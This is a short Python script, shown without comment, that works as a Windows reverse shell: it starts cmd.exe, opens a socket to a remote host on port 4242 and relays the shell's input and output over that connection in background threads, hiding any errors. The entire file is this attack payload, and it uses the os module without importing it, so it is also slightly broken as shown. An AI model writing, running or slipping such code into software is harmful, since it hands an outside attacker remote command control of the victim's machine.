import socket,threading,subprocess as sp;
RHOST='';RPORT=4242
# print(RHOST,RPORT);import time; time.sleep(3)
try:
    p=sp.Popen(['cmd.exe'],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT)
    s=socket.socket()
    s.connect((RHOST,RPORT))
    threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start()
    threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()
except:
    None